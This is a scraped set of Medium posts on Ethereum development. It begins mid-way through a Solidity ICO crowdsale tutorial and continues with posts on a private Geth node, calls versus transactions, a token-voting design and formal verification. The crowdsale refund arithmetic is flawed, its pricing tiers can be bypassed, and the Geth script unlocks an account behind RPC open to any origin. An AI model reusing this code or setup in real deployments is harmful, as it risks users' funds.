transferFrom(address _from, address _to, uint256 _value) public afterCrowdsale returns(bool) {      return super.transferFrom(_from, _to, _value);   }   /// @notice Override the functions to not allow token transfers until the end of the ICO   function approve(address _spender, uint256 _value) public afterCrowdsale returns(bool) {      return super.approve(_spender, _value);   }   /// @notice Override the functions to not allow token transfers until the end of the ICO   function increaseApproval(address _spender, uint _addedValue) public afterCrowdsale returns(bool success) {      return super.increaseApproval(_spender, _addedValue);   }   /// @notice Override the functions to not allow token transfers until the end of the ICO   function decreaseApproval(address _spender, uint _subtractedValue) public afterCrowdsale returns(bool success) {      return super.decreaseApproval(_spender, _subtractedValue);   }   function emergencyExtract() external onlyOwner {      owner.transfer(address(this).balance);   }}As you can see it\u2019s quite complex so be sure to understand every part of it before continuing. You can now create the entire buy() function of the Crowdsale contract like so:contract Crowdsale {   bool public icoCompleted;   uint256 public icoStartTime;   uint256 public icoEndTime;   uint256 public tokenRate;   ICOToken public token;   uint256 public fundingGoal;   address public owner;   uint256 public tokensRaised;   uint256 public etherRaised;   modifier whenIcoCompleted {      require(icoCompleted);      _;   }   modifier onlyOwner {      require(msg.sender == owner);      _;   }   function () public payable {      buy();   }   constructor(uint256 _icoStart, uint256 _icoEnd, uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {      require(_icoStart != 0 &&      _icoEnd != 0 &&      _icoStart < _icoEnd &&      _tokenRate != 0 &&      _tokenAddress != address(0) &&      _fundingGoal != 0);      icoStartTime = _icoStart;      icoEndTime = _icoEnd;      tokenRate = _tokenRate;      token = ICOToken(_tokenAddress);      fundingGoal = _fundingGoal;      owner = msg.sender;   }   function buy() public payable {      require(tokensRaised < fundingGoal);      require(now < icoEndTime && now > icoStartTime);      uint256 tokensToBuy;      uint256 etherUsed = msg.value;      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * tokenRate;      // Check if we have reached and exceeded the funding goal to refund the exceeding tokens and ether      if(tokensRaised + tokensToBuy > fundingGoal) {         uint256 exceedingTokens = tokensRaised + tokensToBuy - fundingGoal;         uint256 exceedingEther;         // Convert the exceedingTokens to ether and refund that ether         exceedingEther = exceedingTokens * 1 ether / tokenRate / token.decimals();         msg.sender.transfer(exceedingEther);         // Change the tokens to buy to the new number         tokensToBuy -= exceedingTokens;         // Update the counter of ether used         etherUsed -= exceedingEther;      }      // Send the tokens to the buyer      token.buyTokens(msg.sender, tokensToBuy);      // Increase the tokens raised and ether raised state variables      tokensRaised += tokensToBuy;      etherRaised += etherUsed;   }   function extractEther() public whenIcoCompleted onlyOwner {      owner.transfer(address(this).balance);   }}Here\u2019s what I did:I added 2 variables: tokenRaised and etherRaised which will be used as counter to keep track of how many tokens are being distributed.Then I checked if the ICO is still open: by checking if we have reached the funding goal or if we the ICO time is over.Next I\u2019m checking if the number of tokens that the person wants to buy is exceeding the funding goal or not. In that case, I\u2019m refunding the ether sent and updating the number of tokens to buy.Finally I\u2019m using the buyTokens() function: from the token contract to transfer those tokens and I\u2019m updating the tokensRaised with the etherRaised to keep track of those important values.That\u2019s about it. You now know how to create an ICO contract. People will be able to buy tokens when the ICO time comes and the ICO will stop when the funding goal is reached or the ICO time is over.You just have to make sure you follow your list of deployment steps to make sure both the token and Crowdsale contracts are 100% functional then, distribute the Crowdsale address so that people send ETH straight to it with any kind of ERC20 compatible wallet such as metamask or myetherwallet.In the following section you\u2019ll find additional information about advanced Crowdsale contracts with several interesting features that I\u2019ve used in the past. Be sure to read it and try all that you see here, even if it\u2019s just copying and pasting the code on remix.4. Advanced ICOs: Variable token pricingAfter developing the basic Crowdsale contract, you\u2019ll usually have to code additional features to your ICO contract since every company has a different set of goals.There are extremely complicated and really simple Crowdsale contracts. The thing is that you have to use the code of the simple Crowdsale contract and work on top of that for making everything easier to yourself as the developer.Following I\u2019ll show you how to add variable token pricing to your ICO to make them more interesting.Variable Token PricingIn many project the price of the token increases as supply gets reduced to incentivise early contributors so that the ICO starts the right way.Here\u2019s how variable token pricing works for an ICO, for instance:I have 100 million tokensI want to sell the first 25 million at the rate of 1 ETH = 5000 tokensThen up to 50 million the rate gets more expensive: 1 ETH = 4000 tokensUp to 75 million it\u2019s: 1 ETH = 3000 tokensAnd up to 100 million it\u2019s 1 ETH = 2000 tokensYet it\u2019s not that easy to implement. First you have to create 4 different state rate variables like so:uint256 public rateOne = 5000;uint256 public rateTwo = 4000;uint256 public rateThree = 3000;uint256 public rateFour = 2000;Before continuing, add the SafeMath library at the top of your Crowdsale contract for making secure mathematical calculations like so:contract Crowdsale {    using SafeMath for uint256;   // Add the past code below}Then you have to modify the buy() function to use the appropriate rate depending on the tokens raised at that time, remember that we are inside the Crowdsale contract:uint256 public rateOne = 5000;uint256 public rateTwo = 4000;uint256 public rateThree = 3000;uint256 public rateFour = 2000;uint256 public limitTierOne = 25e6 * (10 ** token.decimals());uint256 public limitTierTwo = 50e6 * (10 ** token.decimals());uint256 public limitTierThree = 75e6 * (10 ** token.decimals());uint256 public limitTierFour = 100e6 * (10 ** token.decimals());function buy() public payable {   require(tokensRaised < fundingGoal);   require(now < icoEndTime && now > icoStartTime);   uint256 tokensToBuy;   uint256 etherUsed = msg.value;   // If the tokens raised are less than 25 million with decimals, apply the first rate   if(tokensRaised < limitTierOne) {      // Tier 1      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * rateOne;          // If the amount of tokens that you want to buy gets out of this tier      if(tokensRaised + tokensToBuy > limitTierOne) {         tokensToBuy = calculateExcessTokens(etherUsed, limitTierOne, 1, rateOne);      }   } else if(tokensRaised >= limitTierOne && tokensRaised < limitTierTwo) {      // Tier 2      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * rateTwo;          // If the amount of tokens that you want to buy gets out of this tier      if(tokensRaised + tokensToBuy > limitTierTwo) {         tokensToBuy = calculateExcessTokens(etherUsed, limitTierTwo, 2, rateTwo);      }   } else if(tokensRaised >= limitTierTwo && tokensRaised < limitTierThree) {      // Tier 3      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * rateThree;          // If the amount of tokens that you want to buy gets out of this tier      if(tokensRaised + tokensToBuy > limitTierThree) {         tokensToBuy = calculateExcessTokens(etherUsed, limitTierThree, 3, rateThree);      }   } else if(tokensRaised >= limitTierThree) {      // Tier 4      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * rateFour;   }   // Check if we have reached and exceeded the funding goal to refund the exceeding tokens and ether   if(tokensRaised + tokensToBuy > fundingGoal) {      uint256 exceedingTokens = tokensRaised + tokensToBuy - fundingGoal;      uint256 exceedingEther;            // Convert the exceedingTokens to ether and refund that ether      exceedingEther = exceedingTokens * 1 ether / tokenRate / token.decimals();      msg.sender.transfer(exceedingEther);          // Change the tokens to buy to the new number      tokensToBuy -= exceedingTokens;           // Update the counter of ether used      etherUsed -= exceedingEther;   }       // Send the tokens to the buyer   token.buyTokens(msg.sender, tokensToBuy);       // Increase the tokens raised and ether raised state variables   tokensRaised += tokensToBuy;}Do you think you can handle it? Here\u2019s what I did:I added 4 limitTier and tier state variables indicating when should a rate be applied. This is very useful if you want to change the limit of the tiers so that the price increases faster or slower.Then, inside the buy() function, I made a calculation to see when each tier should be applied.You may have noticed that there\u2019s a function called calculateExcessTokens which is used if the amount of tokens that you want to buy gets out of each tier. That function looks like this:function calculateExcessTokens(   uint256 amount,   uint256 tokensThisTier,   uint256 tierSelected,   uint256 _rate) public returns(uint256 totalTokens) {   require(amount > 0 && tokensThisTier > 0 && _rate > 0);   require(tierSelected >= 1 && tierSelected <= 4);   uint256 weiThisTier = tokensThisTier.sub(tokensRaised).div(_rate);   uint256 weiNextTier = amount.sub(weiThisTier);   uint256 tokensNextTier = 0;   bool returnTokens = false;   // If there are excessive weis for the last tier, refund those   if(tierSelected != 4)      tokensNextTier = calculateTokensTier(weiNextTier, tierSelected.add(1));   else      returnTokens = true;   totalTokens = tokensThisTier.sub(tokensRaised).add(tokensNextTier);   // Do the transfer at the end   if(returnTokens) msg.sender.transfer(weiNextTier);}function calculateTokensTier(uint256 weiPaid, uint256 tierSelected)   internal constant returns(uint256 calculatedTokens){   require(weiPaid > 0);   require(tierSelected >= 1 && tierSelected <= 4);if(tierSelected == 1)      calculatedTokens = weiPaid * (10 ** token.decimals()) / 1 ether * rateOne;   else if(tierSelected == 2)      calculatedTokens = weiPaid * (10 ** token.decimals()) / 1 ether * rateTwo;   else if(tierSelected == 3)      calculatedTokens = weiPaid * (10 ** token.decimals()) / 1 ether * rateThree;   else      calculatedTokens = weiPaid * (10 ** token.decimals()) / 1 ether * rateFour;}Those 2 functions are used to calculate how many tokens are exceeding each tier. Imagine this scenario:There are 100 million tokens sold on the ICO with 4 tiers separated by 25 million. So the first tier is applied to up to 25 million tokens, the second to 50 million and so on.What if there are 24 million tokens sold already and you want to buy 2 million tokens?Because we decided that up to 25 million those tokens will have the price of the first tier (cheaper tokens), the right way to solve this problem is to sell 1 million tokens for the price of rateOne and the remaining 1 million tokens for the price of rateTwo .That\u2019s why I\u2019m using a function called calculateExcessTokens which returns you how many tokens are exceeding the selected tier. In the past case it would return 1 million tokens which are exceeding the first tier.Then I use the calculateTokensTier function to calculate how much those 1 million remaining tokens will cost in ETH.In summary, the problem of exceeding tokens is solved with the function calculateExcessTokens along with calculateTokensTier to buy the tokens at the right price for everybody.Note that this is not a perfect solution and it only works if the investor is able to buy less than 25 million tokens. If someone would buy 26 million or more, he could avoid the tiers and get the tokens for cheaper.All said, this is one of the solutions that worked nicely for me in the past. You can use this variable token pricing system for making your own ICOs. You have the complete code in my github here from a real-world ICO I made.You can also see the completed code here for your reference: https://github.com/merlox/sample-icoConclusionCongratulations! You\u2019ve learned how to create ICOs and how to raise money doing so. That\u2019s the easy part. Now the hard thing to do is implement all this knowledge and actually do it in the real world where money is real.If you make a mistake there, you can quite literally destroy lives. Be careful with this power. Pay attention to your code and re-read it 3 times. Have it audited by a third-party person until you know it has everything you need and want.Remember to use the deployment list to make sure you are setting everything up when deploying the final ICO contracts and that they are working when needed. You don\u2019t want them to be faulty when the ICO starts.Join my exclusive email list to receive premium inside-only guides, tutorials and stories here: http://eepurl.com/dDQ2yX. I won\u2019t spam you. In fact, I\u2019ll send you less than 1 email per month.You can get my ebook \u201cEthereum Developer: Learn Solidity From Scratch\u201d here for 20 dollars: https://merunas.io/You can get my complete \u201cEthereum Developer Video Course\u201d here for 300 dollars: https://merunas.io/videocourse more details on the website.Let me know if this tutorial helped you become a better Ethereum Developer to be able to create your own ICOs and maybe raise millions of dollars with the next big revolution. Stay tuned, clap the article and follow my blog here: https://medium.com/@merunasgrincalaitis", "responses": 5, "tags": ["Ethereum", "Solidity", "Merunas", "Blockchain", "Ethereum Blockchain"]}, {"title": "Hands On: Creating Your Own Local Private Geth Node (Beginner Friendly)", "post_link": "https://medium.com/hackernoon/hands-on-creating-your-own-local-private-geth-node-beginner-friendly-3d45902cc612?source=search_post", "author_name": "Niharika Singh", "author_link": "https://medium.com/@Niharika3297", "publish_date": "2018-12-29", "last_modified_date": "2019-05-24", "readtime": "5.24", "claps": 572, "voters": 25, "content": "Hands On: Creating Your Own Local Private Geth Node (Beginner Friendly)Niharika SinghFollowDec 29, 2018 \u00b7 6 min readSource: https://altcointoday.com/If you\u2019re new to the blockchain sphere and want to get a hands-on feel of this ground-breaking yet a-tad-bit arcane technology, this tutorial is for you.This will be a comprehensive step-by-step tutorial for you to get started with Ethereum blockchain. So, don\u2019t worry I will cover each and every step.Source: https://tenor.com/What will we build?A local testnet Ethereum blockchain using Geth.Local: This blockchain will be running only on your computer (formally, node) locally.Testnet: This will not mine real Ethers. Only fake ones. It is perfect for testing dApps, or for just playing around.PrerequisitesMacOSHomebrew (Download link: https://brew.sh/)XCode (Get from AppStore)Setting Up Development EnvironmentStep 0: Download Geth using HomebrewFire up your terminal and enter the following command. Make sure you already have Homebrew installed, otherwise this command will not work for you.$ brew tap ethereum/ethereumThis command will clone Ethereum repo into your Library folder on Mac.To install geth, run the following command:$ brew install ethereumViola, geth is intalled.Before going any further, let me clear what Geth isgeth is the the command line interface for running a full ethereum node implemented in Go. You can mine real ether (if you\u2019re on mainnet), transfer funds between addresses, create smart contracts, make transactions, explore the chain, use Web3 etc.To know more, see this resource:ethereum/go-ethereumOfficial Go implementation of the Ethereum protocol - ethereum/go-ethereumgithub.comLet\u2019s get crackin\u2019 baby!Genesis Block, The Special BlockEvery blockchain has a genesis block, that is the first block. Height of this block is 1. It does not hold any transactions. All later blocks get appended to this block.You can view Ethereum\u2019s mainnet genesis block here: https://etherscan.io/block/0For our testnet, we have to create the genesis block.Tool used to create genesis block: puppethStep 1: Create Genesis blockMake any directory in which you want to store your blockchain data.$ mkdir -p ethereum-tutorial && cd ethereum-tutorialMake a private folder inside this directory and cd into it.$ mkdir -p private && cd privateOpen up your terminal and write following command:$ puppethSomething like this should come up and you will be asked to specify a network name to administer. Enter the name of your blockchain. I used niharikatestnet. You can use any name.A series of questions would be asked. Keep answering.Finally, exit the puppeth interface by using control + c.If you now read the contents in private folder you will see multiple files.We\u2019ll be interested in niharikatestnet.jsonStep 2: Initialise the genesis blockIt\u2019s time to create chaindata and keystore for local blockchain. chaindatawill store all data related to blockchain and keystore will store private keys associated with accounts on the blockchain.Using terminal enter the following command:$ geth --datadir ~/ethereum-tutorial/private init niharikatestnet.jsonSuccessfully wrote genesis state. Woohoo!You should see chaindata and keystore folders.Step 3: Creating accountsWe need to create accounts on this blockchain to play around with it.$ geth --datadir . account newFor each account you create, you have to enter a password to access that account. Enter password of your choice.You will get a unique address for the account.Let\u2019s create 2 more accounts using the same process.So, to view all the accounts we have created:$ geth --datadir . account listStep 4: Write a Shell Script to Start BlockchainIn any text editor, create a file named startnode.sh in private folder.geth --networkid 4224 --mine --minerthreads 1 --datadir \"~/Desktop/Playground/ethereum-tutorial/private\" --nodiscover --rpc --rpcport \"8545\" --port \"30303\" --rpccorsdomain \"*\" --nat \"any\" --rpcapi eth,web3,personal,net --unlock 0 --password ~/ethereum-tutorial/private/password.sec --ipcpath \"~/Library/Ethereum/geth.ipc\"Make sure you write all of this in one line.Create another file named password.sec in private folder.Enter the password for the first account you created and save it.To make this script executable, in your terminal write:$ chmod +x startnode.shExecute this script:$ ./startnode.shThis will start a never-ending output. This is blockchain. Our blockchain has started.Wait for all the DAGs to get generated. In the middle you may see mining taking place. This will put fake ethers in the first account.Step 5: Connect to running gethLet\u2019s get connected with this geth node. On another tab in terminal, run the command.$ geth attachYou will enter into the Geth Javascript console. Here, you can run JavaScript code.This means you\u2019ve successfully connected! Yay!Source: https://tenor.com/Step 6: Query the blockchainLet\u2019s see what all accounts are present on this blockchain.> eth.accountsThis will show the 3 accounts we created earlier.To get balance of the accounts:> eth.getBalance(eth.accounts[0])This will show balance in Wei. To convert this in Ether, do this:> web3.fromWei(eth.getBalance(eth.accounts[0]), \"ether\")Info: Stop Mining or Start MiningIf you wish to stop mining process:$ miner.stop()If you wish to start mining process:$ miner.start()Step 7: Make transactionsLet\u2019s send some ethers from one account to another.We will send ethereum from coinbase account (the account that is mining ethers) to any of the other 2 accounts.> eth.sendTransaction({from: eth.coinbase, to: eth.accounts[1], value: web3.toWei(10, \"ether\")})This will return transaction hash.Now let\u2019s get balance of 2nd account.> web3.fromWei(eth.getBalance(eth.accounts[1]), \"ether\")Now if you switch back to the tab where blockchain is running, you will see a transaction.Since JavaScript is being executed on the Geth console, you can even deploy smart contracts on it.This is the end to this tutorial. :)Hope you had a smooth experience.", "responses": 2, "tags": ["Ethereum", "Bitcoin", "Technology", "Solidity", "JavaScript"]}, {"title": "Calls vs. transactions in Ethereum smart contracts", "post_link": "https://blog.b9lab.com/calls-vs-transactions-in-ethereum-smart-contracts-62d6b17d0bc2?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2018-08-30", "last_modified_date": "2019-03-16", "readtime": "4.05", "claps": 180, "voters": 25, "content": "Image credit: Eduardo S\u00e1nchezCalls vs. transactions in Ethereum smart contractsWhat is the difference between a transaction and a call?Rob HitchensFollowAug 30, 2018 \u00b7 5 min readAmong the most confusing topics in the world of Ethereum smart contracts is the difference between read-only calls and potentially state-changing transactions, and the various ways to implement each. This is partly because the word \u201ccall\u201d is overloaded and means too many different things in too many different contexts.It may be more cognitively useful to categorize the two modes of operation as \u201clocal\u201d and \u201cverified\u201d.Local vs. verifiedThe Ethereum state is somewhat different from a typical database. The implications take some getting used to. Each node has a copy of the state, much like a replica, and each node independently verifies the authenticity of the state as the blocks arrive and transactions are processed locally. In this way, each node can know that its own copy of the state is legitimate.Local copies mean that a node can explore and inspect the state without any further assistance from the network. Nodes can even run contract functions to discover what would happen if the same inputs were actually sent to the network. Since the network is not even consulted during such local explorations, the network cannot possibly know about any attempted state change. Consequently, such operations are read-only, by definition.Callers can invoke any contract function on a local read-only basis with the call() method Web3 attaches to every contract function. This relies on local resources, and returns values sent by contract return statements. This is useful for \u201cdry-run\u201d, \u201cwhat if\u201d exercises. This is part of the gas cost estimation process, and this is the normal way to invoke read-only contract functions, a.k.a. \u201cgetters\u201d.Here\u2019s where it gets a little confusing, though.Contract authors can hard-code this behavior into contract functions using the keywords \u201cview\u201d and \u201cpure\u201d (in the past, \u201cconstant\u201d was used).view: Will read the state but will not change it.pure: Does not need access to the state and will not change it.Read-only invocations, whether hard-coded at the contract level or requested with the client-side \u201ccall()\u201d method, run much faster than transactions that require network verification. Still, it\u2019s important to keep in mind that the design is not optimized for application-specific performance and these fetch operations still may require considerable digging through the ever-growing blockchain state.Verified transactions that potentially change the state are sent to the network for verification. Consequently, senders don\u2019t receive return values. Instead, they receive a transaction hash and must wait for the transaction to be mined. Even then, the return results won\u2019t be returned and they must inspect the logs or call other functions to discover what happened.This causes a significant delay, the mining delay, that needs to be carefully accounted for in user interface design in order to create a responsive, informative and satisfying user experience \u2014 at least if the users are expected to be human.What about messages?Another topic that can be a source of considerable confusion is the concept of an internal transaction, also known as a \u201cmessage\u201d. Contract functions can call other contract functions. Even if those are also potentially state-changing, the processing time can be thought of as roughly instantaneous. Normal intuitive ideas of performance such as processing time simply do not apply in a world where network nodes learn about completed transactions only after they are officially part of the past. And that\u2019s exactly what happens. Blocks arrive with ordered lists of transactions. In most important respects, those transactions can be considered completely executed regardless of complexity.Does a call that does not change the state cost gas?Since read-only functions can and often are called from state-changing transactions, those functions in that case are executed by every verifying node. Each node will reach identical results, given the same initial state and the same transaction order. This is considerable redundant work, and therefore the normal constraints and gas accounting apply to read-only functions and read-only functions can run out of gas. While these read-only operations are often described as \u201cfree\u201d, they are not so if wrapped in a state-changing transaction because network resources are involved.In the case that the client initiates a read-only operation, then the gas is, effectively, returned. More precisely, the calling account\u2019s balance remains unchanged because the network was not even informed about the operation.Remember, a client can also invoke any function using the Web3 .call() method.In all three cases (view, pure and .call()) the following apply:The contract will run on local CPU using a local copy of the blockchain (if needed at all) and there will be no network verification of anything.The EVM gas accounting applies and will be tracked. That is, if the contract function includes gas accounting (how much is left?) then it will work as normal in a \u201cdry run\u201d mode, using call(), for example. Same applies to \u201cout of gas\u201d situations. Sufficient gas must be supplied with the request.Since there is no network verification, there is no possibility of a state change. This includes the result that ether spent to supply gas is, effectively, returned. More precisely, it was never really sent because the network wasn\u2019t informed.Hopefully this post provides some clarity about what\u2019s going on, but the best way to learn is by doing.I invite you to try executing calls and transactions yourself in the online Ethereum Developer Course I teach with my colleagues at B9lab.", "responses": 1, "tags": ["Ethereum", "Smart Contracts", "Ethereum Blockchain", "Solidity", "Learning To Code"]}, {"title": "Hydro Dev Update: 5/4", "post_link": "https://medium.com/hydrogen-api/hydro-dev-update-5-4-204f318f320f?source=search_post", "author_name": "Andy Chorlian", "author_link": "https://medium.com/@HydroAndy", "publish_date": "2018-05-04", "last_modified_date": "2018-05-24", "readtime": "1.05", "claps": 227, "voters": 18, "content": "Hydro Dev Update: 5/4Andy ChorlianFollowMay 4, 2018 \u00b7 2 min readEvery Friday, the Hydro dev team provides updates on what they\u2019ve been working on over the past week.May the 4th be with you! We have been internally testing our Hydro Client Raindrop application, and we are extremely excited about the release! Our Front End Team has been coding away to make sure the application is bug free and looking gorgeous. Meanwhile, Noah and I have been making sure that our API and documentation are are all up to snuff. We have moved over our API to use OAuth authentication and are updating all of our error messages to make sure that they are clear and concise.Alongside this, Noah and I have completed our internal POC of the Snowflake smart contracts. As we continue to build this out you can monitor our progress here. Our main focus this week was on making sure the logic of the identity contract works alongside the escrow contract. This is crucial for us, as escrowing Hydro is a key piece of our Snowflake protocol. It is still very much in concept and testing phases so expect lots of changes. If you\u2019re interested in chatting with us about blockchain-based identity or our 2FA, don\u2019t hesitate to reach out on Discord!We\u2019d love to hear from you! Please get in touch via Discord, Reddit, or Telegram.", "responses": 1, "tags": ["Blockchain", "Dev Update", "Solidity", "2fa", "Ethereum"]}, {"title": "Token-weighted voting implementation Part 2", "post_link": "https://medium.com/colony/token-weighted-voting-implementation-part-2-13e490fe1b8a?source=search_post", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2016-09-29", "last_modified_date": "2018-06-06", "readtime": "4.50", "claps": 155, "voters": 24, "content": "Token-weighted voting implementation Part 2Secret voting and the double linked listElena DimitrovaFollowSep 29, 2016 \u00b7 5 min readThis is the second of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol.Here, we continue to define the double linked list used to manage vote secrets and we dive into the voting implementation itself as well as the logic behind determining if an address is locked.Vote secrets data structure \u2014 the double linked listVote secrets are stored in a double linked list. Each entry consists of the poll id, vote secret and is ordered by poll close time. The list contains only the unrevealed vote secrets for a user, i.e. when a vote is revealed, it is removed from this list.Double linked list of vote secrets ordered by poll close timeZero-entry itemThe list implementation uses a helper zero-entry item where the previousItem link points to the last item in the list and the nextItem link points to the first item in the list, thus closing the list structure.This design gives us less edge cases as we don\u2019t need to track variables such as the first item in the list, the item count or cater for special cases where we\u2019re inserting at the start or at the end of the list.Design for poll votes that close at the same timeAdditionally, we need to design support for cases where two or more polls close at the same time, thus having conflicting pollCloseTime in the ordered list. We solve this by having a second inner double linked list. We move the pollId and vote secret into this inner list, leaving the outer list to just holding pollCloseTime information.Example design for this above, models a user having voted 5 times in polls with Ids: 1, 5, 8, 12 and 14. Polls 1 and 5 close at the same time at timestamp 10, while the other polls (8, 12 and 14) close at unique times, respectively 52, 123 and 456 and thus have just a single vote secret entry against them in the inner list.The storage data model of the key/value pairs for two linked lists can therefore be modelled as follows//Doubly linked list holding polls closeTimessha3(\"Voting\", userAddress, pollCloseTime, \"prevTimestamp\") => uint256 prevTimestampsha3(\"Voting\", userAddress, pollCloseTime, \"nextTimestamp\") => uint256 nextTimestamp//Doubly linked list holding vote secretssha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"secret\") => bytes32 secretsha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"prevPollId\") => uint256 pollIdsha3(\"Voting\", userAddress, pollCloseTime, \"secrets\", pollId, \"nextPollId\") => uint256 pollIdSorting double linked lists In the case where the smart contract is responsible for finding the position in the list for a new vote, it\u2019s possible that in the transaction inserting the vote runs out of gas, as we iterate through items to find the right order.We solve this by delegating to the user the job of providing us the position where their vote needs to be inserted. We validate the position info they give us and do the insert.In addition to lower gas costs, as we don\u2019t sort on the blockchain, this approach has the added benefit of a fixed and predictable transaction cost for adding a vote secret to the list, as storage cost is fixed.Secret votingWhenever a user makes a vote, first they must establish what their precommitted vote secret is to be. They do this by finding the Keccak hash of a salt value and the chosen poll option Id. This is the equivalent of calling sha3(salt, pollOptionId); in Solidity.The salt is required so that the user\u2019s vote cannot be discerned pre-reveal. The salt is revealed during the reveal phase, and so should not be sensitive, but it should be unique for every vote and not have to be remembered or chosen by the user. The voteID signed with the user\u2019s private key, for example, would meet these requirements, as would the brief signed with the user\u2019s private key, which would have the additional benefit of allowing the user to prove what they voted on, as well as the direction they voted.The user then calls the vote function,function submitVote(    uint256 pollId,    bytes32 secret,    uint256 prevTimestamp,    uint256 prevPollId)which has four arguments:uint256 pollId \u2014 Id of the poll which they\u2019re voting onbytes32 secret \u2014 The secret string described aboveuint256 prevTimestamp \u2014 The timestamp that the secret should be inserted after for the outer list (of poll closing times) to remain correctly sorted. If this is 0, then the current element is the first element in the linked list that comes after the zero-entry item. uint256 prevPollId \u2014 The poll Id that the secret should be inserted after for the inner list (of poll ids and vote secrets) to remain correctly sorted.A number of validations then take place before the secret is added, to ensure the poll is open and its closingTime hasn\u2019t past as well as the position in the outer and inner lists is correct.isAddressLocked functionThe purpose of the double linked lists are two fold: firstly as described above, to store unrevealed votes and secondly, to determine if an address is locked.An address is defined as locked, if there is at least 1 vote a user has to reveal, i.e. at least one vote for poll which has closed.This check is implemented in a function, namely isAddressLocked(address) which looks at the outer list of pollCloseTimes, takes the first item in the list (after the zero-entry item) and compares the now block timestamp against it. Since the list is ordered by pollCloseTimes, we guarantee that if the first item in the list is less than the now timestamp, i.e. the poll close time for that first item has passed, there is at least one vote secret which needs to be revealed and therefore the user address is locked.Sample scenario for a locked addressThis model can be implemented as followsIn the third and final article we\u2019ll examine how the isAddressLocked function above is used to extend the token implementation. We also look at the mechanics of revealing a vote.", "responses": 4, "tags": ["Ethereum", "Blockchain", "Solidity", "Dao"]}, {"title": "Formal Verification for n00bs -Part 2: proving the correctness of a token", "post_link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-2-proving-the-correctness-of-a-token-74085f5cd6c1?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2019-02-02", "last_modified_date": "2019-04-04", "readtime": "5.24", "claps": 551, "voters": 24, "content": "Formal Verification for n00bs -Part 2: proving the correctness of a tokenMarek KirejczykFollowFeb 2 \u00b7 6 min readThis is the second post of a series Formal Verification for n00bs:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with ActPart 4: Understanding K languageIn this post, we will explain an example of a high-level semantics of a single function of an Ethereum smart contract and a step-by-step guide for executing the proof.We will take a look at an official example given by KLAB in their GitHub repository of a transfer function for a simple token.ExampleThe first important file is the source file of the analyzed contract token.sol, see below.Second important file is high-level semantics of a function transfer from the Token contract above. File spec.md contains semantics written in ACT, a specific DSL language, created by KLAB. See below.Semantics step-by-stepThe specification above is split logically into 4 sections:Preamble: Consists of behavior and interface headers. States behavior (intended!) of what function and from which contract we are about to describe;Types: a section with declarations of auxiliary variables;Statements of our semantic claim: here are described under the storage header;Assumptions of our semantic claim: covered by two headers: iff and if.PreambleThe syntax is as follows:where:<name> \u2014 stands for our name for our described semantics, for informative purposes only. It does not need to be the same as the name of the function, as in our case;<Contract> \u2014 identifies the name of considerate contract;<function> \u2014 identifies the name and the interface of considerate function.So, in our case, we declare that we are starting the description of intended behavior of a function transfer from the contract Token.TypesTypes are our internal variables used only for the purpose of our specification. We use EVM types here. In our case, we declared FromBal and ToBal, both uint256 integers.AssumptionsWe will now focus on assumptions that are at the bottom of the spec, specifically under headers iff and if. The meaning of this section is slightly unintuitive:iff <condition> \u2014 states intention that condition is either true or execution will revert;if <condition> \u2014 states intention that we care only about the case when the condition is true.Note that in our example we have a somewhat complex condition for iff.The construction above states that values of all <expression_i> fit inside range of <type> (i.e. no overflows happen).In our case: both (FromBal-Value) and (ToBal+Value) must contain in the range of uint256.The condition for if is much simpler. It just states that CALLER_ID is different from To, where CALLER_ID denotes the address of the caller of the transfer function.About assumptions more formallyIntuitive meaning for semantics is the following: if assumptions are met before the execution of the function, then \u2014 after the execution \u2014 all the statements must hold.Here, this is almost true. A small hook is in the fact, that the assumptions part is divided into if and iff part. Formally, it works the following way:denotes that:if \u2014 at the beginning \u2014 both A and B hold, then the execution finishes with success and afterwards all Statements holds;if \u2014 at the beginning \u2014 B holds and A doesn\u2019t hold, then the execution finishes with a REVERT;the case when B does not hold is not covered by the considerated semantics.StatementsIn our case, statements section is described only by two clauses, both under storage header. In general, other headers are possible (stack, pc -program counter), but let\u2019s focus precisely on what we have:A line <X> |-> <Y> => <Z> can be stated informally as:If we denote the value of the memory (before the execution) at address <X> with <Y>, then it is equal to <Z> after the execution.Unobvious aspect of the above notation is hidden in the declaration of <X>. The issue comes from the fact that our semantics are verified not with the source code but with the corresponding bytecode of the contract. It means that we cannot refer directly to variables (balanceOf, totalSupply) but we need to provide the storage address(or key in ethereum storage Merkle Patricia trie if you will) that keeps the data (here we refer to low-level implementation of EVM). This is somewhat complicated (especially for maps) and the details can be found [here]. For our purposes it is sufficient to know that element of index i in a map balanceOf in our contract is kept in the Merkle tree at position hash(0 + i) which is denoted as #hashedLocation(\u201cSolidity\u201d, 0, i) in language K (that is underneath ACT). 0 comes from balanceOf being the very first variable declaration in the contract. At this point you might be a bit lost since in the spec file you can see for example #Token.balances[To] that seems to refer directly to the variable balanceOf. This is however only an illusion since in the file klab/examples/token/src/storage.mdyou see a macro that translates this expression into to actual address. This is written in K language. We will dig into K in future posts.The high-level semantics: altogetherFinally, the intended semantics described in the spec file might be in informally expressed as follows:The behaviour of transfer(address To, uint Value) when the address of the caller is equal to To is undefined. So we assume that CALLER_ID is always different from To. Then, if either (balanceOf[To] + Value) or (balanceOf[CALLER_ID]-Value) falls out of range of uint256, the function finishes wit REVERT. Finally, if both above expressions are in range of uint256, then the value of balanceOf[CALLER_ID] decreases by Value, and balances[To] increases by Value.3, 2, 1 \u2026Action!Let\u2019s check (automatically!) if the above semantics is corresponding to the actual code. We need to:Compile the source file into the bytecode. The result is already here:klab/examples/token/dapp/out/token.sol.jsonIf you wish to repeat this step by yourself, remember to compile with the flags:2. Build K statements from the bytecode and semantics. You can do that by runninginside the directory examples/token. The result will be visible at 